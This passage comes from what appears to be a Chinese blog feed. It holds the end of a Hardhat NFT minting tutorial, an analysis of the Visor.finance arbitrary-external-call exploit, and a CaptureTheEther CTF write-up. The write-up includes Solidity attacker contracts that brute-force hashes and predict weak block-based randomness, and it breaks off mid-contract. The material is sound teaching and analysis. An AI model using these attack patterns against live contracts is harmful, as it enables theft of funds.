&#x27;@openzeppelin/contracts/utils/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract MintExample is ERC721Enumerable, Ownable&#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    constructor (</span><br><span class="line">        string memory name,</span><br><span class="line">        string memory symbol</span><br><span class="line">    ) ERC721(name, symbol) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function mint(uint256 numberOfMints) public payable &#123;</span><br><span class="line">        uint256 supply = totalSupply();</span><br><span class="line">        for(uint256 i; i &lt; numberOfMints; i++) &#123;</span><br><span class="line">            _safeMint(msg.sender, supply + 1);</span><br><span class="line">            balances[msg.sender]++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该合约提供简单的 mint 功能，在合约编写完成后编译合约</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npx hardhat compile</span><br></pre></td></tr></table></figure><p>在合约编译完成后在 artifacts/contracts 文件夹中存储合约的 ABI，在 src 文件夹下新建 <code>mintExampleAbi.json</code>，将合约的 ABI 复制到该文件中</p><p><img src="/image/hardhat_init.assets/image-20220417180403552.png" alt="image-20220417180403552"></p><h5 id="0x03-测试合约"><a href="#0x03-测试合约" class="headerlink" title="0x03 测试合约"></a>0x03 测试合约</h5><p>编写测试文件</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">&quot;chai&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line">describe(<span class="string">&quot;MintExample&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  it(<span class="string">&quot;Should return the mint balance&quot;</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//signer表示以太坊账户对象，用于将交易发送到合约和其他账户，在这里获取所连接节点中的账户列表</span></span><br><span class="line">    <span class="comment">//hardhat network 节点只保留第一个账户</span></span><br><span class="line">    <span class="keyword">const</span> [owner] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">    <span class="comment">//ContractFactory 是用于部署新合约的抽象</span></span><br><span class="line">    <span class="keyword">const</span> MintExample = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">&quot;MintExample&quot;</span>);</span><br><span class="line">    <span class="comment">//将俩个参数传入构造函数，这里的 MintExample 是用来实例合约的工厂</span></span><br><span class="line">    <span class="keyword">const</span> mintExample = <span class="keyword">await</span> MintExample.deploy(<span class="string">&quot;MINT&quot;</span>, <span class="string">&quot;MINT&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用 owner 调用合约中的 mint 方法铸造一个 MINT</span></span><br><span class="line">    <span class="keyword">await</span> mintExample.connect(owner).mint(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//利用断言式来判断代币余额与铸造金额是否相等</span></span><br><span class="line">    expect(<span class="keyword">await</span> mintExample.balances(owner.address)).to.equal(<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 hardhat 中测试合约</p><p><img src="/image/hardhat_init.assets/image-20220417181225491.png"></p><h5 id="0x05-部署合约"><a href="#0x05-部署合约" class="headerlink" title="0x05 部署合约"></a>0x05 部署合约</h5><p>当通过测试以后部署合约，首先需要启动 hardhat 节点</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npx hardhat node</span><br></pre></td></tr></table></figure><p><img src="/image/hardhat_init.assets/image-20220417182940057.png" alt="image-20220417182940057"></p><p>编写部署脚本，将合约部署到 hardhat 网络，即部署到 localhost</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> hre = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> MintExample = <span class="keyword">await</span> hre.ethers.getContractFactory(<span class="string">&quot;MintExample&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> mintExample = <span class="keyword">await</span> MintExample.deploy(<span class="string">&quot;Minter&quot;</span>, <span class="string">&quot;MINT&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> mintExample.deployed();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;MintExample deployed to:&quot;</span>, mintExample.address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">  .then(<span class="function">() =&gt;</span> process.exit(<span class="number">0</span>))</span><br><span class="line">  .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">    process.exit(<span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npx hardhat run scripts/sample-script.js --network localhost</span><br></pre></td></tr></table></figure><p>部署完成后会获取一个合约地址</p><p><img src="/image/hardhat_init.assets/image-20220417181744766.png" alt="image-20220417181744766"></p><h5 id="0x06-编写前端"><a href="#0x06-编写前端" class="headerlink" title="0x06 编写前端"></a>0x06 编写前端</h5><p>以下为<code>App.js</code>代码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./App.css&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> mintExampleAbi <span class="keyword">from</span> <span class="string">&quot;./mintExampleAbi.json&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; ethers, Bignumber &#125; <span class="keyword">from</span> <span class="string">&quot;ethers&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; useEffect, useState &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; use &#125; <span class="keyword">from</span> <span class="string">&#x27;chai&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//合约部署的地址</span></span><br><span class="line"><span class="keyword">const</span> mintExampleAddress = <span class="string">&quot;0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//CONNECTING</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//当页面加载时这个变量是空的，当连接后从区块链获取信息时，使用状态可以更新</span></span><br><span class="line">  <span class="keyword">const</span> [accounts, setAccounts] = useState([]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这个函数会调用 metamask钱包</span></span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">connectionAccounts</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//window.ethereum 会检查是否运行 metamask </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.ethereum) &#123;</span><br><span class="line">      <span class="keyword">const</span> accounts = <span class="keyword">await</span> <span class="built_in">window</span>.ethereum.request(&#123;<span class="attr">method</span>: <span class="string">&quot;eth_requestAccounts&quot;</span>&#125;);</span><br><span class="line">      setAccounts(accounts);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//当页面加载时调用一次 connectionAccounts 函数</span></span><br><span class="line">  useEffect(<span class="function">() =&gt;</span> &#123;connectionAccounts();&#125;,[]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// MINTING</span></span><br><span class="line">  <span class="keyword">const</span> [mintAmount, setMintAmount] = useState(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">handleMint</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.ethereum) &#123;</span><br><span class="line">      <span class="comment">// provider 是一种连接到区块链的特定方式</span></span><br><span class="line">      <span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.Web3Provider(<span class="built_in">window</span>.ethereum);</span><br><span class="line">      <span class="comment">//定义一个 signer ，任何时候的交易涉及代币的交换或者任何具有财务价值的东西都必须签署签名</span></span><br><span class="line">      <span class="keyword">const</span> signer = provider.getSigner();</span><br><span class="line">      <span class="keyword">const</span> contract = <span class="keyword">new</span> ethers.Contract(mintExampleAddress, mintExampleAbi.abi, signer);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//将想要 mint 的数量作为参数传递给 mint</span></span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> contract.mint(mintAmount);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;response: &quot;</span>, response);</span><br><span class="line">      &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;error&quot;</span>, err);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is how you create a mint button<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">      &#123;accounts.length &amp;&amp; (</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> setMintAmount(mintAmount - 1)&#125;&gt;-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            &#123;mintAmount&#125;</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> setMintAmount(mintAmount + 1)&#125;&gt;+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleMint&#125;</span>&gt;</span>Mint<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">              Mint</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">      )&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前端代码完成后在项目目录执行<code>npm run start</code></p><p><img src="/image/hardhat_init.assets/image-20220417183105333.png" alt="image-20220417183105333"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;p&gt;Hardhat 是一个用于编译、部署、测试和调试以太坊软件的开发环境。它可以帮助开发人员管理和自动化构建智能合约和 dApp 过程中固有的重</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>从 Visor.finance 事件学习任意外部调用漏洞</title>
    <link href="https://banana69.site/2022/03/25/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/"/>
    <id>https://banana69.site/2022/03/25/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-03-25T04:42:54.000Z</published>
    <updated>2022-03-25T06:47:55.750Z</updated>
    
    <content type="html"><![CDATA[<h3 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h3><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320221429315.png" alt="image-20220320221429315"></p><p>首先查看攻击交易：</p><p><a href="https://etherscan.io/tx/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f">https://etherscan.io/tx/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f</a></p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320221534097.png" alt="image-20220320221534097"></p><p>可以看到从0地址俩次转出大量的vVISR代币，由于<strong>0地址不会主动转账或者授权配额</strong>，所以可以猜测这些vVISR代币是mint出来的。</p><p>然后使用blocksec的交易分析工具分析，<a href="https://versatile.blocksecteam.com/tx/eth/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f%EF%BC%8C%E4%BD%BF%E7%94%A8">https://versatile.blocksecteam.com/tx/eth/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f，使用</a> invocation flow 功能可以查看调用关系，对其中的地址和函数进行查询找到标签，然后使用<code>customize account map</code>功能，将其替换为自定义标签，可以提高调用关系的可读性。</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320222843697.png" alt="image-20220320222843697"></p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320222945110.png" alt="image-20220320222945110"></p><p>自定义后的标签为：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;0x0000000000000000000000000000000000000000&quot;</span>: <span class="string">&quot;Null Address: 0x000…000&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;0x8efab89b497b887cdaa2fb08ff71e4b3827774b2&quot;</span>: <span class="string">&quot;Visor Finance Exploiter&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;0xf938424f7210f31df2aee3011291b658f872e91e&quot;</span>: <span class="string">&quot;Visor Finance: VISR Token&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;0xc9f27a50f82571c1c8423a42970613b8dbda14ef&quot;</span>: <span class="string">&quot;Visor Finance RewardsHypervisor&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;0x3a84ad5d16adbe566baa6b3dafe39db3d5e261e5&quot;</span>: <span class="string">&quot;vVISR&quot;</span>,</span><br><span class="line"> <span class="attr">&quot;0x10c509aa9ab291c76c45414e7cdbd375e1d5ace8&quot;</span>: <span class="string">&quot;Exploit contract&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>替换标签后的调用关系图为：</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320223428363.png" alt="image-20220320223428363"></p><p>攻击步骤：</p><ol><li>攻击合约的<code>0x4a0b0c38</code>匿名函数调用了<code>Visor Finance RewardsHypervisor</code>合约中的<code>deposit</code>函数，把攻击合约的地址和攻击者的地址作为参数传入；</li><li>在调用<code>deposit</code>函数后，又回调了攻击合约的<code>owner，dekegatedTransferERC20</code>函数；</li><li>在<code>dekegatedTransferERC20</code>函数中重入到了<code>Visor Finance RewardsHypervisor</code>合约并且调用了<code>deposit</code>函数.</li></ol><p>在清楚了攻击流程之后可以推测出<code>RewardsHypervisor </code>合约的 <strong>deposit</strong> 函数内存在<strong>任意外部调用漏洞</strong>。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>查看<code>RewardsHypervisor</code> 合约的开源代码：</p><p><a href="https://etherscan.io/address/0xc9f27a50f82571c1c8423a42970613b8dbda14ef/advanced#code">https://etherscan.io/address/0xc9f27a50f82571c1c8423a42970613b8dbda14ef/advanced#code</a></p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220321080927216.png" alt="image-20220321080927216"></p><p>这段代码的逻辑是存入一定数量的<code>visr</code>就会mint出一定数量的<code>vvsir</code>给用户，<code>vvsir</code>为流动性代币，且函数 <code>deposit</code>为 external，可以被外部调用。</p><p>代码分析：</p><ol><li><p>参数<code>visrDeposit</code>为声明存入的<code>Visr</code>的数量；参数<code>from</code>为 visr 来源地址；参数<code>to</code>为 接受 vvsir 的地址；</p></li><li><p>返回值<code>share</code>为 <strong>mint</strong> 出的 vvsir 数量；</p></li><li><p>46-48行判断：存入的 <code>Visr</code>数量必须大于0，且不能讲 mint 的流动性代币发送到 0 地址或者此合约（Visor Finance RewardsHypervisor）的地址；</p></li><li><p>51-54行：如果代币<code>vvisr</code>代币的总供应量不为 0， 那么计算此合约中的 <code>visr</code>的余额（这个合约本身持有<code>visr</code>代币），根据比例计算出需要 <strong>mint</strong> 出的 <code>vvsir</code>的数量，53行为需要 <strong>mint</strong> 的 <code>vvsir</code>的数量<code>share = (visrDeposit / visrBalance) * vvisr总量</code>；</p><p><code>mul(x,y) = x * y, div(x, y) = x / y</code></p><p><code>share.mul(a) = share * a, share.div(a) = share / a</code></p></li><li><p>56-61行：判断发送<code>visr</code>的地址是否为合约地址，如果是合约地址，则检查 <strong>msg.sender</strong> 是不是合约的 <strong>owner</strong>，然后要求这个合约实现 <code>IVsior</code>接口，调用<code>from</code> 的<code>delegatedTransferERC20</code>函数，从<code>from</code>地址向当前合约地址发送<code>visrDeposit</code>数量的 visr。</p><p>由于对 <strong>from</strong> 未作出任何限定，所以 <strong>from</strong> 可以是任何合约。攻击者只需要定义一个<code>delegatedTransferERC20</code>函数就可以绕过充值直接 <strong>mint</strong>。</p></li><li><p>如果 <strong>from</strong> 不是合约地址，就调用 <code>visr.safeTransferFrom</code>函数，由于传入的 <strong>from</strong> 参数和 <strong>to</strong> 参数可控，意味着可以用别人授权给 <strong>RewardsHypervisor</strong> 合约的 <strong>visr</strong> 充值进去，再 <strong>mint vvisr</strong> 给自己。</p></li><li><p>转入<strong>vvisr</strong> 以后可以调用 <code>withdraw</code>函数将其转换成 <strong>visr</strong>，然后在市场上售卖完成变现。</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220321132601411.png" alt="image-20220321132601411"></p></li></ol><p> <code>IVsior</code>接口说明：</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220321113438989.png" alt="image-20220321113438989"></p><p> <code>IVsior</code>接口就是要求合约转账，这个函数的主要问题在于56-59行中，若传入的地址是合约，那么检测传入 <code>visr</code>的合约地址的 <strong>owner</strong> 是 <strong>msg.sender</strong> ，然后调用 <strong>from</strong> 的 <code>delegatedTransferERC20</code>函数，本意是检测 <strong>msg.sender</strong> 的授权转账。</p><ul><li><p><strong>问题 1:</strong></p><p>因为 <strong>from</strong> 可以是自己实现的合约，所以攻击者可以自己实现 <code>delegatedTransferERC20</code>函数，可以不实现转账并且满足<code>require</code>，并且<code>Hypervisior</code>合约本身就有钱，可以根据参数<code>visrDeposit</code>计算出最后 <strong>mint</strong> 出的 <code>vvisr</code>值发送给攻击者。</p></li><li><p><strong>问题 2:</strong></p><p>判断 <strong>from</strong> 不是合约地址时，<code>visr.safeTransferFrom</code>函数，由于传入的 <strong>from</strong> 参数和 <strong>to</strong> 参数可控，意味着可以用别人授权给 <strong>RewardsHypervisor</strong> 合约的 <strong>visr</strong> 充值进去，再 <strong>mint vvisr</strong> 最后发送给攻击者。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;攻击分析&quot;&gt;&lt;a href=&quot;#攻击分析&quot; class=&quot;headerlink&quot; title=&quot;攻击分析&quot;&gt;&lt;/a&gt;攻击分析&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83</summary>
      
    
    
    
    <category term="智能合约" scheme="https://banana69.site/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    
    <category term="智能合约审计" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CaptureTheEther WriteUp</title>
    <link href="https://banana69.site/2022/03/17/capturetheether/"/>
    <id>https://banana69.site/2022/03/17/capturetheether/</id>
    <published>2022-03-17T07:21:46.000Z</published>
    <updated>2022-07-28T06:39:38.953Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a>Guess the secret number</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheSecretNumberChallenge &#123;</span><br><span class="line">    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function GuessTheSecretNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        if (keccak256(n) == answerHash) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目需要猜一个uint8的变量经过keccak256后的值与answerHash相等，由于uint8的范围是0-255，所以写一个爆破的智能合约就可以解出最后的答案</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//爆破合约</span><br><span class="line">contract crack &#123;</span><br><span class="line">    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line">    uint8 public result;</span><br><span class="line">   function crackresult() returns (uint8) &#123;</span><br><span class="line">     for (uint8 i = 0; i &lt;= 255; i++) &#123;</span><br><span class="line">         if (keccak256(i) == answerHash) &#123;</span><br><span class="line">             result = i;</span><br><span class="line">             return i;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//result = 170</span><br></pre></td></tr></table></figure><h3 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a>Guess the random number</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    function GuessTheRandomNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题中的answer在构造函数中进行了初始化，所以根据solidity的存储结构，变量answer的值被存储在slot0中，此时的answer作为状态变量存储在storage中，所以可以使用web3js在微storage中读取</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">web3.js.getStorageAt(<span class="string">&quot;contract Address&quot;</span>, <span class="number">0</span>, <span class="built_in">console</span>.log)</span><br></pre></td></tr></table></figure><h3 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">    function GuessTheNewNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attacker &#123;</span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        uint8 result = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">        GuessTheNewNumberChallenge target = GuessTheNewNumberChallenge(0x4779f53F8141Ab6Aa7414CAB3A2184Cc4c32C56A);</span><br><span class="line">        target.guess.value(1 ether)(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题需要获取到前一个区块的hash与当前的时间戳，由于每个区块包含很多个交易，而同一个区块的交易的前一个区块hash与时间戳都是相等的，所以可以通过部署另一个合约，从该合约调用目标合约中的guess函数使这俩个交易在一个块内。</p><h3 id="predict-the-future"><a href="#predict-the-future" class="headerlink" title="predict the future"></a>predict the future</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheFutureChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题生成随机数的方式与上一题相同，不同点在于需要在<code>lockInGuess</code>函数处输入guess的值，然后<code>settlementBlockNumber</code>函数限制了在<code>settle()</code>函数中生成hash的块必须在<code>lockInGuess</code>块之后，所以无法直接调用<code>settle()</code>函数，由于最后获取hash值的方法为模10运算，因此answer的范围是0-9，因此可以利用爆破的方法来解决这道题。</p><p>思路：</p><ul><li>由于题目中锁定用户用的是<code>msg.sender</code>,所以需要部署一个攻击合约来随便猜一个数字，首先在攻击合约中调用<code>lockInGuess</code>函数，将猜的数字作为该函数的参数发送。</li><li>调用攻击合约中的爆破函数计算hash值与上一步猜的数字是否相等，当此块的信息得到的answer与我们猜的guess相同时我们再调用settle函数，以免guesser被清零。</li></ul><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td 